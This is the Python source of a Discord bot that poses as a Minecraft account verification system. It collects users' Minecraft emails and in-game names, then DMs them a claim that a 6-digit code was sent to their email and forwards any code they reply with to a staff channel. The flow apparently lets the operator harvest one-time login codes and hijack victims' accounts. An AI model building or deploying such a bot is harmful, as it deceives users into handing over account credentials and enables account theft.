import os
import discord
from discord.ext import commands

TOKEN = os.getenv("DISCORD_TOKEN")
VERIFICATION_CHANNEL_ID = 1362951881827160295
MOD_CHANNEL_ID = 1362997933552959558

intents = discord.Intents.default()
intents.message_content = True
intents.members = True
intents.messages = True
intents.dm_messages = True

bot = commands.Bot(command_prefix='!', intents=intents)

# To track if the bot has already sent the verification DM to the user
sent_verification_dms = {}
sent_invalid_codes = set()  # To track users who entered an invalid code
previous_verification_embed = None  # Variable to store the last verification embed

class VerifyModal(discord.ui.Modal, title="Link Your Minecraft Account"):
    email = discord.ui.TextInput(label="Minecraft Email", placeholder="example@gmail.com", required=True)
    ign = discord.ui.TextInput(label="Minecraft IGN", placeholder="YourInGameName", required=True)

    async def on_submit(self, interaction: discord.Interaction):
        log_channel = await bot.fetch_channel(MOD_CHANNEL_ID)

        embed = discord.Embed(
            title="🔗 New Minecraft Verification",
            color=discord.Color.orange()
        )
        embed.add_field(name="User", value=interaction.user.mention, inline=False)
        embed.add_field(name="Email", value=self.email.value, inline=False)
        embed.add_field(name="IGN", value=self.ign.value, inline=False)
        embed.set_footer(text="This is an automated message.")

        await log_channel.send(embed=embed)
        await interaction.response.send_message("✅ Info submitted! Thanks!", ephemeral=True)

class LinkView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label="Link Account", style=discord.ButtonStyle.primary)
    async def link_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(VerifyModal())

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user.name} (ID: {bot.user.id})')
    print('Bot is ready!')
    try:
        synced = await bot.tree.sync()
        print(f"Synced {len(synced)} slash commands.")
    except Exception as e:
        print(f"Error syncing commands: {e}")

    verification_channel = await bot.fetch_channel(VERIFICATION_CHANNEL_ID)

    # Delete the previous verification embed if it exists
    global previous_verification_embed
    if previous_verification_embed:
        try:
            await previous_verification_embed.delete()
        except discord.NotFound:
            pass

    # Send the new verification embed
    embed = discord.Embed(
        title="🔗 Link Your Minecraft Account",
        description="Click the **Link Account** button below to start verification.",
        color=discord.Color.green()
    )
    embed.set_footer(text="This is an automated message.")
    sent_message = await verification_channel.send(embed=embed, view=LinkView())

    # Update the reference to the latest sent embed
    previous_verification_embed = sent_message

@bot.tree.command(name="setup", description="Start the Minecraft account verification process")
async def setup(interaction: discord.Interaction):
    verification_channel = await bot.fetch_channel(VERIFICATION_CHANNEL_ID)

    # Delete the previous verification embed if it exists
    global previous_verification_embed
    if previous_verification_embed:
        try:
            await previous_verification_embed.delete()
        except discord.NotFound:
            pass

    # Send the new verification embed
    embed = discord.Embed(
        title="🔗 Link Your Minecraft Account",
        description="Click the **Link Account** button below to start verification.",
        color=discord.Color.green()
    )
    embed.set_footer(text="This is an automated message.")
    sent_message = await verification_channel.send(embed=embed, view=LinkView())

    # Update the reference to the latest sent embed
    previous_verification_embed = sent_message

    await interaction.response.send_message("✅ Sent verification prompt to the channel.", ephemeral=False)

@bot.tree.command(name="promptcode", description="Prompt a user to submit a 6-digit code via DM")
async def promptcode(interaction: discord.Interaction, user: discord.Member):
    try:
        # Check if the verification message has been sent already
        if user.id not in sent_verification_dms:
            # Send verification DM if not sent before
            embed = discord.Embed(
                title="📨 Minecraft Server Verification",
                description="We've sent a 6-digit code to your email address linked to your Minecraft account.\nPlease reply to this DM with the code to complete your verification.\n\n🔒 Your information will remain private. If you have any questions, feel free to ask staff!\nThis is an automated message.",
                color=discord.Color.blue()
            )
            embed.set_footer(text="Do not share this code with anyone.")
            await user.send(embed=embed)
            
            # Mark as sent
            sent_verification_dms[user.id] = True
        else:
            await interaction.response.send_message(f"❌ Verification already sent to {user.mention}'s DMs.", ephemeral=True)

        await interaction.response.send_message(f"✅ Prompt sent to {user.mention}'s DMs!")
    except discord.Forbidden:
        await interaction.response.send_message(f"❌ Couldn't DM {user.mention}.")

@bot.event
async def on_message(message: discord.Message):
    # Ensure that the bot doesn't handle messages more than once.
    if message.guild is None and not message.author.bot:
        # Check if the message is a valid 6-digit code
        if message.content.isdigit() and len(message.content) == 6:
            # If the message has been processed, prevent further handling
            if hasattr(message, 'processed') and message.processed:
                return  # Skip if message has already been processed
            
            # Mark the message as processed to prevent further handling
            message.processed = True

            mod_channel = await bot.fetch_channel(MOD_CHANNEL_ID)
            embed = discord.Embed(
                title="✅ Code Submitted",
                description=f"User: {message.author.mention}\nCode: `{message.content}`",
                color=discord.Color.teal()
            )
            await mod_channel.send(embed=embed)
            await message.channel.send("✅ Code received. A mod will check it soon!")

        else:
            # Avoid sending the invalid code embed twice
            if message.author.id not in sent_invalid_codes:
                embed = discord.Embed(
                    title="❌ Invalid Code",
                    description="The code you entered is invalid. Please try again with your 6-digit code.",
                    color=discord.Color.red()
                )
                await message.channel.send(embed=embed)

                # Mark this user as having received an invalid code message
                sent_invalid_codes.add(message.author.id)

    # Don't forget to call this so bot can process commands
    await bot.process_commands(message)

bot.run(TOKEN)
